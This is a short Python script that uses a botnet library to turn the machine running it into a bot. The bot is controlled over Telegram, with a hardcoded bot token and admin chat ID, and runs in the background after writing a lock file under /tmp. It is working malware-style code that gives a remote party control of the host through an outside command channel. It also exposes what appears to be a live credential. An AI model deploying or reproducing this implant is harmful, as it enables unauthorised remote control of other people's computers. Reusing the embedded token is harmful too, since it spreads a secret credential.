#!/usr/bin/python3
from pybotnet import BotNet, TelegramEngine
import os

lock_file = "/tmp/main_lock"

if not os.path.exists(lock_file):
    with open(lock_file, "w") as lock:
        lock.write("Lock")


telegram_engine = TelegramEngine(token="6660924010:AAH1gGxy4g9K93brhy2sXyj--GTRfGdyhXs", admin_chat_id="1927705157") #(1)

botnet = BotNet(telegram_engine) # (2)
botnet.run_background() 
